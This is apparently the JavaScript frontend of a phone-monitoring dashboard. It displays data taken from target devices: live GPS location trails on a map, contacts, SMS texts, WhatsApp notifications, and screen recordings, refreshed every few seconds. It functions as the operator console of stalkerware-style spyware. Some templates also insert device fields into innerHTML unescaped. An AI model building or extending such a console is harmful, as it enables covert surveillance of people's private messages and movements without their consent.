// main.js - frontend com map, websocket e media player
const API_BASE = '/api';
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
}
function logout() { localStorage.removeItem(tokenKey); localStorage.removeItem(userKey); location.reload(); }
function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

const api = {
  post: async (path, body, token) => {
    const res = await fetch(API_BASE + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
      body: JSON.stringify(body)
    });
    return res.json();
  },
  get: async (path, token) => {
    const res = await fetch(API_BASE + path, { headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }});
    if (!res.ok) return [];
    return res.json();
  },
  download: async (path, token) => {
    const res = await fetch(API_BASE + path, { headers: { Authorization: 'Bearer ' + token }});
    if (!res.ok) throw new Error('download failed');
    return res.blob();
  }
};

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/login', { username: u, password: p });
  if (r.token) { setLoggedIn(r.user, r.token); showDashboard(); } else { document.getElementById('loginMsg').innerText = r.error || 'Login failed'; }
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = r.ok ? 'Registered, login' : (r.error || 'Register failed');
});
document.getElementById('btnLogout').addEventListener('click', logout);

function showSection(id) {
  const sections = ['devicesSection','contactsSection','messagesSection','notifsSection','mediaSection','historySection'];
  sections.forEach(s => {
    const el = document.getElementById(s);
    if (el) el.classList.add('hidden');
  });
  const visible = document.getElementById(id);
  if (visible) visible.classList.remove('hidden');
}

document.getElementById('iconDevices').addEventListener('click', ()=> { showSection('devicesSection'); });
document.getElementById('iconMessages').addEventListener('click', ()=> { showSection('messagesSection'); });
document.getElementById('iconNotifs').addEventListener('click', ()=> { showSection('notifsSection'); });
document.getElementById('iconContacts').addEventListener('click', ()=> { showSection('contactsSection'); });
document.getElementById('iconMedia').addEventListener('click', ()=> { showSection('mediaSection'); });
document.getElementById('iconMap').addEventListener('click', ()=> { showSection('historySection'); initMapIfNeeded(); });

let socket = null;
let map = null;
let markers = {};
let polyline = null;
let pathCoords = [];

async function initSocket() {
  if (socket) return;
  const token = getToken();
  if (!token) return;
  socket = io('/', { query: { token } });

  socket.on('connect', () => {
    console.log('socket connected');
  });

  socket.on('location:new', (loc) => {
    console.log('location:new', loc);
    // update map and lists
    addLocationToMap(loc);
    prependHistoryItem(loc);
  });

  socket.on('media:new', (m) => {
    console.log('media:new', m);
    // refresh media list
    loadMedia();
  });

  socket.on('disconnect', ()=> console.log('socket disconnected'));
}

function initMapIfNeeded() {
  if (map) {
    document.getElementById('map').classList.remove('hidden');
    return;
  }

  document.getElementById('map').classList.remove('hidden');
  map = L.map('map').setView([0,0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap contributors'
  }).addTo(map);

  polyline = L.polyline([], { color: 'blue' }).addTo(map);
  loadLocationsToMap(); // initial load
  initSocket();
}

async function loadLocationsToMap() {
  const token = getToken();
  if (!token) return;
  const locs = await api.get('/location', token);
  pathCoords = [];
  if (!Array.isArray(locs)) return;
  locs.forEach(l => {
    const lat = parseFloat(l.lat), lon = parseFloat(l.lon);
    if (isNaN(lat) || isNaN(lon)) return;
    pathCoords.push([lat, lon]);
    const mk = L.marker([lat, lon]).addTo(map);
    mk.bindPopup(`<b>${l.deviceId}</b><br/>${lat.toFixed(5)},${lon.toFixed(5)}<br/>${new Date(l.timestamp).toLocaleString()}<br/><a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}">Navegar</a>`);
  });
  if (pathCoords.length) {
    polyline.setLatLngs(pathCoords);
    map.fitBounds(polyline.getBounds(), { padding: [50,50] });
  }
}

function addLocationToMap(loc) {
  try {
    const lat = parseFloat(loc.lat), lon = parseFloat(loc.lon);
    if (isNaN(lat) || isNaN(lon)) return;
    const mk = L.marker([lat, lon]).addTo(map);
    mk.bindPopup(`<b>${loc.deviceId}</b><br/>${lat.toFixed(5)},${lon.toFixed(5)}<br/>${new Date(loc.timestamp).toLocaleString()}<br/><a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}">Navegar</a>`);
    // extend polyline
    pathCoords.push([lat, lon]);
    polyline.setLatLngs(pathCoords);
  } catch (e) { console.error(e); }
}

function prependHistoryItem(loc) {
  const el = document.getElementById('historyList');
  if (!el) return;
  const li = document.createElement('div');
  li.innerHTML = `<b>${loc.deviceId}</b> ${new Date(loc.timestamp).toLocaleString()} — ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} <a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${loc.lat},${loc.lon}">Navegar</a>`;
  el.prepend(li);
}

async function loadDevices() {
  const token = getToken(); if (!token) return;
  const devs = await api.get('/devices', token);
  const box = document.getElementById('devicesList');
  box.innerHTML = '';
  devs.forEach(d => {
    const el = document.createElement('div');
    const online = d.lastSeen && (Date.now() - new Date(d.lastSeen)) < 120000;
    el.innerHTML = `<strong>${d.label || d.deviceId}</strong> ${online ? '<span style="color:green">● online</span>' : '<span style="color:red">● offline</span>'} <br/>LastSeen: ${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'never'}`;
    box.appendChild(el);
  });
}

async function loadContacts() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/contacts', token);
  const list = document.getElementById('contactsList');
  list.innerHTML = '';
  arr.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.name} — ${c.number}`; list.appendChild(li); });
}

async function loadSms() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/sms', token);
  const list = document.getElementById('smsList'); list.innerHTML = '';
  arr.forEach(s => { const li = document.createElement('li'); li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`; list.appendChild(li); });
}

async function loadNotifs() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/whatsapp', token);
  const list = document.getElementById('notifList'); list.innerHTML = '';
  arr.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.sender}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; list.appendChild(li); });
}

async function loadMedia() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/media', token);
  const list = document.getElementById('mediaList'); list.innerHTML = '';
  arr.forEach(m => {
    const li = document.createElement('li');
    const btn = document.createElement('button');
    btn.textContent = 'Ver/Download';
    btn.onclick = async () => {
      try {
        const blob = await api.download('/media/' + m._id, token);
        if (m.type === 'screen_record' || m.contentType && m.contentType.startsWith('video')) {
          const url = URL.createObjectURL(blob);
          const player = document.getElementById('mediaPlayer');
          player.innerHTML = `<video controls src="${url}" style="max-width:100%;height:auto"></video>`;
        } else {
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a'); a.href = url; a.download = m.filename || 'file'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
        }
      } catch (e) { alert('download failed'); }
    };
    li.appendChild(document.createTextNode(`${m.filename || m._id} [${m.type||m.contentType}] `));
    li.appendChild(btn);
    list.appendChild(li);
  });
}

async function render() {
  const token = getToken();
  if (!token) return;
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  const user = getUser();
  document.getElementById('userInfo').innerText = user ? user.username : '';
  await initSocket();
  await loadDevices(); await loadContacts(); await loadSms(); await loadNotifs(); await loadMedia(); await loadLocationsList();
}

async function loadLocationsList() {
  const token = getToken();
  if (!token) return;
  const arr = await api.get('/location', token);
  const el = document.getElementById('historyList'); if (!el) return;
  el.innerHTML = '';
  arr.forEach(l => { const div = document.createElement('div'); div.innerHTML = `${new Date(l.timestamp).toLocaleString()} — ${l.lat.toFixed(5)},${l.lon.toFixed(5)} <a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${l.lat},${l.lon}">Navegar</a>`; el.appendChild(div); });
}

function showDashboard() {
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  render();
  setInterval(() => { loadDevices(); loadMedia(); loadSms(); loadNotifs(); }, 5000);
}

window.addEventListener('load', () => {
  if (getToken()) showDashboard();
});
